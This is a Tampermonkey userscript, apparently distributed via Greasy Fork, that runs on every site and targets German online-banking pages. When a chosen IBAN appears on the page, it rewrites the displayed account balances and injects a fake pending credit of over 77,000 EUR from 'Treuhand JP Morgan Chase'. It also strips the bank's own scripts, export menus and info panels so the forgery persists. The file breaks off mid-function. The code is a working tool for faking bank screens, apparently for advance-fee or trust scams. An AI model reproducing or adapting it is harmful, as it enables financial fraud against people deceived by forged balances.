// ==UserScript==
// @name         Ed 4Rec Comm hemplerpeter@gmail.com
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/507953/Ed%204Rec%20Comm%20hemplerpeter%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/507953/Ed%204Rec%20Comm%20hemplerpeter%40gmailcom.meta.js
// ==/UserScript==



//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------


//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL


   // Configurable modification amounts and corresponding indexes
    var homeBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 0 },
  //      { index: 1, adjustmentAmount: 20000 },
  //      { index: 2, adjustmentAmount: 10000 },
  //      { index: 3, adjustmentAmount: -5000 },
  //      { index: 4, adjustmentAmount: 20000 },
  //      { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];


//2 COMM FINSISCHT CHANGE BAL


// Configurable modification amounts and their corresponding indexes
 const gesamtfinanzaccountBalanceAdjustments = [
       { index: 0, amount: 0  },
        { index: 1, amount: 5 },
      { index: 2, amount: 6 },
     { index: 3, amount: 7 },
      { index: 4, amount: 8 },

   ];

  // Configurable modification amounts and corresponding indexes
    var finanzBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 0  },
    //    { index: 1, adjustmentAmount: 20000 },
    //    { index: 2, adjustmentAmount: 10000 },
    //    { index: 3, adjustmentAmount: -5000 },
    //    { index: 4, adjustmentAmount: 20000 },
    //    { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];



//3 and COMM UMSATZE BALANCE MODIF and 8 COMM KONTODETAILS


  //6 COMM TRANSACTIONOVERVIEW BAL CHANGE


    var balanceChange = 0  ; // Specify the amount to increase or decrease the main balance   DONT'T CHANGE IT!!!
    let targetTextContent = 'smth'; // Specify the target text content for presence check    DONT'T CHANGE IT!!!








//7 COMM TRANSACTIONOVERVIEW INSERT


  // Check for the presence of the specified text content on the page
    let specifiedTextContent = "smth";

//    const specifiedTextContent = "DE54 2004 0000 0275 6245 00"; // Specified text content

            //  // Manual configuration of text content for multiple transactions
             var transactionsnew = [{
                  date: 'Vorgemerkt',
                   name: 'Treuhand JP Morgan Chase',
                   details: 'Freigabe nötig. A. Gold meldet sich.',
                   type: 'Gutschrift',
                  amount: '+77.271,72 EUR',
             },
  //                                  {
  //                date: '13.08.24',
  //                 name: 'JP Morgan Chase',
  //                 details: 'Geld für 10%. A. Gold meldet sich.',
  //                 type: 'Gutschrift',
  //                amount: '+3.500,00 EUR',
  //           },
  //                                  {
  //                date: '13.08.24',
  //                 name: 'JP Morgan Chase',
  //                 details: 'Geld für 10%. A. Gold meldet sich.',
  //                 type: 'Gutschrift',
  //                amount: '+3.500,00 EUR',
 //            },
//   {
//                  date: '25.07.2024',
//                   name: 'JP Morgan Chase',
 //                  details: 'Geld für Steuern',
 //                  type: 'Gutschrift',
 //                 amount: '+6.700,00 EUR',
  //           },
                // Add more transactions as needed
               ];

//8 COMM KONTODETAILS  (look at 3)

//    // Set the amount to increase or decrease the main balance
//    var balanceModificationAmount = -10000; // Change this value as needed

//    // Specify the text content to look for on the page
//    var targetTextContent = "DE40 2108 0050 0104 6378 00";



///IBAN CONFIGURATION_______________________________________________________

     specifiedTextContent = targetTextContent = "3434 DE02 6004 0071 0723 7555 00"

///IBAN CONFIGURATION_______________________________________________________




//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
///////////////////////////////////////////////////////////////////////////////




 if (window.location.href.indexOf("startpage") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0) {
    'use strict';

 //   // Configurable modification amounts and corresponding indexes
 //   var homeBALANCE_CONFIGS = [
 //       { index: 0, adjustmentAmount: 10000 },
//        { index: 1, adjustmentAmount: 20000 },
 //       { index: 2, adjustmentAmount: 10000 },
//        { index: 3, adjustmentAmount: -5000 },
 //       { index: 4, adjustmentAmount: 20000 },
 //       { index: 5, adjustmentAmount: -15000 }
 //       // Add more configurations as needed...
 //   ];

    // Function to modify the balance
    function modifyBalance() {
        // Check for the presence of the element with the class "icon-ico-CSV text-white"
        const csvElement = document.querySelector('.lsgs-0d6f7--subline-container.lsgs-0d6f7--subline-container__align-left') && document.querySelector('.ucc-sp-amount.lsgs-0d6f7--copy-text');
        if (csvElement) {
            // Find all elements containing the "€" sign in their text content
            const balanceElements = document.querySelectorAll('.ucc-sp-amount.lsgs-0d6f7--copy-text');
            homeBALANCE_CONFIGS.forEach(config => {
                const balanceElement = balanceElements[config.index];
                if (balanceElement && balanceElement.textContent.includes('EUR')) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + config.adjustmentAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' EUR';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        console.log(`Balance at index ${config.index} modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the csvElement 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.lsgs-0d6f7--subline-container.lsgs-0d6f7--subline-container__align-left');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class '.lsgs-0d6f7--subline-container.lsgs-0d6f7--subline-container__align-left' removed.");
                            }
                        }, 5);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                }
            });
        }
    }

    // Function to remove elements with the class 'ucc-sp-headline lsgs-0d6f7--info-text'
    function removeInfoTextElements() {
        const elementsToRemove = document.querySelectorAll('.ucc-sp-headline.lsgs-0d6f7--info-text');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log("Element with class '.ucc-sp-headline.lsgs-0d6f7--info-text' removed.");
        });
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Call the function to modify the balance every 7 seconds
    setInterval(modifyBalance, 100);

    // Call the function to remove the '.ucc-sp-headline.lsgs-0d6f7--info-text' class every 50 milliseconds
    setInterval(removeInfoTextElements, 50);
}


//END  1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  END
///////////////////////////////////////////////////////////////////////////////
//END   1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  END
///////////////////////////////////////////////////////////////////////////////
//END   1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL   END



//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------


///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("digitalbanking/financeoverview") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0) {
    'use strict';

  // Configurable modification amounts and their corresponding indexes
// const gesamtfinanzaccountBalanceAdjustments = [
 //     { index: 0, amount: 700 },

 //  ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
const presenceCheckElement = document.querySelector('.lsgs-577b7--overline.lsgs-577b7--overline-large') && document.querySelector('.lsgs-577b7--h3');
        if (presenceCheckElement) {
            // Iterate over each balance adjustment configuration
            gesamtfinanzaccountBalanceAdjustments.forEach(({ index, amount }) => {
                // Find the balance element based on index
                const balanceElements = document.querySelectorAll('.lsgs-577b7--h3');
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            // Remove the presence check element 5 milliseconds after modification
          setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.lsgs-577b7--overline.lsgs-577b7--overline-large');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.lsgs-577b7--overline.lsgs-577b7--overline-large");
                });
            }, 5);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }


      modifyBalances();
        setInterval(modifyBalances, 30); // 10000 milliseconds = 10 seconds


                    }





if (window.location.href.indexOf("digitalbanking/financeoverview") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0) {

    'use strict';

 //   // Configurable modification amounts and corresponding indexes
//    var finanzBALANCE_CONFIGS = [
// //       { index: 0, adjustmentAmount: 10000 },
//        { index: 1, adjustmentAmount: 20000 },
//        { index: 2, adjustmentAmount: 10000 },
////        { index: 3, adjustmentAmount: -5000 },
//        { index: 4, adjustmentAmount: 20000 },
//        { index: 5, adjustmentAmount: -15000 }
//        // Add more configurations as needed...
 //   ];

    // Function to modify the balance
    function modifyBalance() {
        // Check for the presence of the element with the class "icon-ico-CSV text-white"
        const csvElement = document.querySelector('.PersonalizedBalance-module_infoPanel__ftubm') && document.querySelector('.lsgs-577b7--two-line-item__label-text.lsgs-577b7--two-line-item__label-text--centered');
        if (csvElement) {
            // Find all elements containing the "€" sign in their text content
            const balanceElements =  document.querySelectorAll('.lsgs-577b7--two-line-item__label-text.lsgs-577b7--two-line-item__label-text--centered');
            finanzBALANCE_CONFIGS.forEach(config => {
                const balanceElement = balanceElements[config.index];
                if (balanceElement && balanceElement.textContent.includes('EUR')) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + config.adjustmentAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' EUR';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        console.log(`Balance at index ${config.index} modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the csvElement 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.PersonalizedBalance-module_infoPanel__ftubm');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class '.PersonalizedBalance-module_infoPanel__ftubm' removed.");
                            }
                        }, 5);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                }
            });
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

function removeSpecificElement() {
    // Remove the first element
    const firstElementToRemove = document.querySelector('.ActionBar-module_exportMenu__k4QT0.lsgs-577b7--grid-column.lsgs-577b7--grid-column__md-col-2.lsgs-577b7--grid-column__sm-col-2.lsgs-577b7--grid-column__xs-col-2');
    if (firstElementToRemove) {
        firstElementToRemove.remove();
        console.log("Element with class '.ActionBar-module_exportMenu__k4QT0' removed.");
    }

    // Remove the second element
    const secondElementToRemove = document.querySelector('.Table-module_balancePerSection__O9GhR');
    if (secondElementToRemove) {
        secondElementToRemove.remove();
        console.log("Element with class '.Table-module_balancePerSection__O9GhR' removed.");
    }
}

    // Call the function to modify the balance every 100 milliseconds
    setInterval(modifyBalance, 100);

    // Call the function to remove the specific element every 50 milliseconds
    setInterval(removeSpecificElement, 50);
}

///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------











//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0) {
    'use strict';

    // Configuration
//    var balanceChange = 10000.50; // Specify the amount to increase or decrease the main balance
//    var targetTextContent = 'DE402108 0050 0104 6378 00'; // Specify the target text content for presence check
    var additionalTextContent = 'Ihr Kontostand beträgt'; // Additional text content to check

    // Function to remove scripts from the document
    function removeScripts() {
      console.log('Removing scripts...');
      document.querySelectorAll('script').forEach(function (script) {
        script.remove();
        console.log('Script removed.');
      });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
      for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
          for (var node of mutation.addedNodes) {
            if (node.tagName === 'SCRIPT') {
              console.log('Script added. Removing...');
              node.remove();
              console.log('Script removed.');
            }
          }
        }
      }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

  // Convert the targetTextContent to lowercase and remove whitespaces for case-insensitive and whitespace-insensitive comparison
var targetTextContentLower = targetTextContent.replace(/\s+/g, '').toLowerCase();

// Function to update the balance
function updateBalance() {
  console.log('Performing balance check...');
  // Check for the presence of the specified text content and additional text content
  var bodyText = document.body.textContent.replace(/\s+/g, ' ');
  var bodyTextLower = bodyText.replace(/\s+/g, '').toLowerCase(); // Convert bodyText to lowercase and remove whitespaces
  if (
    new RegExp(targetTextContentLower, 'i').test(bodyTextLower) &&
    bodyText.includes(additionalTextContent)
  ) {

      //--------------------------------------------------------
// Find the target element where the main balance is located
var balanceHeader = document.querySelector('.BalanceOverview-module_balanceOverview__header__szyuV h4.lsgs-ab96e--h4');

// Check if the target element is found
if (balanceHeader) {
  // Get the current balance value
  var balanceText = balanceHeader.childNodes[1].textContent.trim();
  var currentBalance = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

  // Check if the current balance is a valid number
  if (!isNaN(currentBalance)) {
    // Calculate the new balance by adding or subtracting the specified value
    var newBalance = currentBalance + balanceChange;

    // Update the text content with the new balance, formatting it accordingly
    balanceHeader.childNodes[1].textContent = ' ' + newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';

    // Remove additional text content after 5 milliseconds
    setTimeout(function () {
      var additionalTextElement = document.querySelector('body');
      if (additionalTextElement) {
        additionalTextElement.innerHTML = additionalTextElement.innerHTML.replace(additionalTextContent, '');
      }
    }, 5);
  }
}
//-----------------------------------------------------------------------




  }
}



    // Check for conditions and execute balance modification every 2 seconds
    setInterval(updateBalance, 50);

}

///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////






//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------



if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0 ) {


(function () {
    'use strict';

    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.classList && node.classList.contains("TransactionsTable-module_transactionsTable__container__syWTd")) {
                        executeScript();
                        observer.disconnect(); // Stop observing once the target element is found
                        return; // Exit the loop once the target element is found
                    }
                }
            }
        }
    });

    observer.observe(document.documentElement, { childList: true, subtree: true });

    function executeScript() {
        // Your script content here
        // Paste your entire script content inside this function
        // Ensure that all variables and functions are declared within this scope
        // so they can access each other without any issues

        // Your existing script content goes here...
        // Be sure to include the setTimeout function and adjust the timeoutDuration as needed
        // Also, ensure to include any dependencies or external scripts that your script relies on

  //      // Specify the text content to search for
 //      var specifiedTextContent = "DE40 2108 0050 0104 6378 00";

        // Configuration
        var timeoutDuration = 100; // Specify the timeout duration in milliseconds

        // Timeout function
        setTimeout(function () {
            // Check for the presence of the specified text content on the page
            var searchText = specifiedTextContent.replace(/\s/g, '').toLowerCase(); // Remove white spaces and convert to lowercase
            var bodyText = document.body.textContent.replace(/\s/g, '').toLowerCase();

            if (bodyText.includes(searchText) && searchText.length >= 9) {
                console.log("Specified text content found. Proceeding with the script.");

        //        //  // Manual configuration of text content for multiple transactions
        //     var transactionsnew = [{
        ////          date: 'Vorgemerkt',
        //           name: 'Treuhand Payward Ltd',
        //           details: 'Commerzbank 00210641/Holstenstr.',
        //           type: 'Gutschrift',
        //          amount: '+129.691,00 EUR',
        //     },
                // Add more transactions as needed
         //      ];

// Define custom width for the "name" field (optional)
var customWidthForName = '125px'; // Set your desired width here for the "name" field

// Create container div
var transactionContainer = document.createElement('div');
transactionContainer.className =
    'TransactionsTable-module_transactionsTable__container__syWTd';
transactionContainer.setAttribute('data-cy', 'table-container_BOOKED');

transactionsnew.forEach(function (transactionConfig, index) {
    // Create header div
    var headerDiv = document.createElement('div');
    headerDiv.className =
        'TransactionsTable-module_transactionsTable__header__UNYFq';

    // Create left side header div
    var leftSideHeaderDiv = document.createElement('div');
    leftSideHeaderDiv.className =
        'TransactionsTable-module_transactionsTable__headerLeftSide__rtcrj';

    // Create date paragraph
    var dateParagraph = document.createElement('p');
    dateParagraph.className = 'lsgs-ab96e--helper-text';
    dateParagraph.setAttribute('aria-atomic', 'true');
    dateParagraph.textContent = transactionConfig.date;
    dateParagraph.style.padding = '5px'; // Set padding for date

    // Append date paragraph to left side header div
    leftSideHeaderDiv.appendChild(dateParagraph);

    // Create right side header div
    var rightSideHeaderDiv = document.createElement('div');
    rightSideHeaderDiv.className =
        'TransactionsTable-module_transactionsTable__headerRightSide__l4r5q';

    // Append left and right side header divs to header div
    headerDiv.appendChild(leftSideHeaderDiv);
    headerDiv.appendChild(rightSideHeaderDiv);

    // Append header div to transaction container
    transactionContainer.appendChild(headerDiv);

    // Create table element
    var tableElement = document.createElement('table');
    tableElement.className =
        'TransactionsTable-module_transactionsTable__table__Y97S6';
    tableElement.setAttribute('data-cy', 'table_BOOKED');

    // Append table element to transaction container
    transactionContainer.appendChild(tableElement);

    // Create table caption
    var tableCaption = document.createElement('caption');
    tableCaption.className =
        'TransactionsTable-module_transactionsTable__caption__leYQ-';
    tableCaption.textContent =
        'Umsätze vom ' + transactionConfig.date + '. Der Tagessaldo beträgt ';

    // Append caption to table
    tableElement.appendChild(tableCaption);

    // Create table head
    var tableHead = document.createElement('thead');
    tableHead.className =
        'TransactionsTable-module_transactionsTable__tableHead__8R3ik';

    // Create head row
    var headRow = document.createElement('tr');
    headRow.className =
        'TransactionsTable-module_transactionsTable__headRow__qMUXP';

    // Create table header cells
    [
        { text: 'Zahlungsverkehrspartner', style: { width: '100px', padding: '5px', textAlign: 'left' } },
        { text: 'Vorausichtliche Buchung', style: { width: '150px', padding: '5px', textAlign: 'left' } },
        { text: 'Umsatzart', style: { width: '80px', padding: '35px', textAlign: 'left' } },
        { text: 'Betrag', style: { width: '50px', padding: '5px', textAlign: 'right' } },
        { text: 'Mehr Optionen', style: { width: '120px', padding: '5px', textAlign: 'left' } },
    ].forEach(function (headerConfig) {
        var headCell = document.createElement('th');
        headCell.className =
            'TransactionsTable-module_transactionsTable__headCell__3Ye1W';
        headCell.textContent = headerConfig.text;
        Object.assign(headCell.style, headerConfig.style); // Apply style
        headRow.appendChild(headCell);
    });

    // Append head row to table head
    tableHead.appendChild(headRow);

    // Append table head to table
    tableElement.appendChild(tableHead);

    // Create table body
    var tableBody = document.createElement('tbody');
    tableBody.className =
        'TransactionsTable-module_transactionsTable__tableBody__AApDD';

    // Create data row
    var dataRow = document.createElement('tr');
    dataRow.className =
        'TransactionRow-module_transactionRow__wNO99 TransactionRow-module_transactionRow__align__HAnfH';

    // Create table cells for data
    ['name', 'details', 'type', 'amount'].forEach(function (field) {
        var cell = document.createElement('td');
        cell.className = 'TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__' + field + '__As3Zn';

        // Apply individual style based on the field
        var cellStyle = {
            name: { width: customWidthForName || '300px', padding: '5px', textAlign: 'left' }, // Use custom width if provided
            details: { width: '300px', padding: '5px', textAlign: 'left' },
            type: { width: '50px', padding: '15px', textAlign: 'left' },
            amount: { width: '30px', padding: '5px', textAlign: 'right' }
        }[field];

        Object.assign(cell.style, cellStyle); // Apply style

        // Create link
        var link = document.createElement('a');
        link.href = '#';
        link.className =
            'TransactionRow-module_transactionRow__sideLayerSwitcher__uW146 TransactionRow-module_transactionRow__categorizationGranted__pUeii';

        // Create paragraph
        var paragraph = document.createElement('p');

        if (field === 'amount') {
            // Check if the amount is positive or negative
            var isPositive = transactionConfig.amount.startsWith('+');
            paragraph.className = isPositive ?
                'TransactionRow-module_transactionRow__positiveAmount__0JFuZ lsgs-ab96e--info-text' :
                'undefined lsgs-ab96e--info-text';
        } else {
            paragraph.className = 'lsgs-ab96e--info-text';
        }

        paragraph.textContent = transactionConfig[field];

        // Set text alignment to center for type
        if (field === 'details') {
            paragraph.style.textAlign = 'left';
        } else {
            // Set text alignment to right for amount
            paragraph.style.textAlign =
                field === 'amount' ? 'right' : 'left';
        }

        // Append paragraph to link
        link.appendChild(paragraph);

        // Append link to cell
        cell.appendChild(link);

        // Append cell to data row
        dataRow.appendChild(cell);
    });

    // Append data row to table body
    tableBody.appendChild(dataRow);

    // Append table body to table
    tableElement.appendChild(tableBody);
});

// Append transaction container to the document body or any other desired location
document.body.appendChild(transactionContainer);





                // Find the target element where you want to insert the new transaction
                var targetElement = document.querySelector('[class*="TransactionsTable-module_transactionsTable__container__syWTd"]');

                // Check if the target element is found
                if (targetElement) {
                    // Insert the new transactions before the target element
                    targetElement.parentNode.insertBefore(
                        transactionContainer,
                        targetElement
                    );
                }
            } else {
                console.log("Specified text content not found. Exiting script.");
            }
        }, timeoutDuration);

        // Function to check and insert transactions periodically
        function checkAndInsertTransactions() {
            var existingTransactionContainer = document.querySelector('[data-cy="table-container_BOOKED"]');
            var targetElement = document.querySelector('[class*="TransactionsTable-module_transactionsTable__container__syWTd"]');

            if (!existingTransactionContainer && targetElement) {
                // Transactions haven't been inserted and target element is found, so insert them
                targetElement.parentNode.insertBefore(transactionContainer, targetElement);
                console.log('Transactions inserted.');
            } else if (!targetElement) {
                console.log("Target element not found. Will check again in the next interval.");
            } else {
                console.log('Transactions already inserted.');
            }
        }

        // Function to check specified text content at regular intervals
        function checkSpecifiedTextContent() {
            var searchText = specifiedTextContent.replace(/\s/g, '').toLowerCase(); // Remove white spaces and convert to lowercase
            var bodyText = document.body.textContent.replace(/\s/g, '').toLowerCase();

            if (bodyText.includes(searchText) && searchText.length >= 9) {
                console.log("Specified text content found in regular check.");
            } else {
                console.log("Specified text content not found in regular check.");
            }
        }

        // Initial insertion of transactions
        checkAndInsertTransactions();

        // Set interval to check and insert transactions every 2 seconds
        setInterval(function () {
            checkAndInsertTransactions();
            checkSpecifiedTextContent();
        }, 300);
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var xcobserver = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    xcobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

})();

 }

///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////



//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("banking/accountdetails") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10726848058") > 0) {
  (function() {
    'use strict';

	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	//CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////


//    // Set the amount to increase or decrease the main balance
//    var balanceModificationAmount = -10000; // Change this value as needed

//    // Specify the text content to look for on the page
//    var targetTextContent = "DE40 2108 0050 0104 6378 00";

    // Set the timeout duration in milliseconds (e.g., 5000 for 5 seconds)
    var timeoutDuration = 200;

	//CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////
	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    // Function to parse and return the numeric balance from a given element
    function parseBalanceFromElement(element) {
        if (element) {
            // Extract the current balance text content
            var currentBalance = element.textContent.trim();

            // Extract the numeric value from the current balance
            var numericBalance = parseFloat(currentBalance.replace(/[^\d,-]/g, '').replace(',', '.'));

            if (!isNaN(numericBalance)) {
                return numericBalance;
            } else {
                console.error('Failed to extract numeric balance from the element:', element);
            }
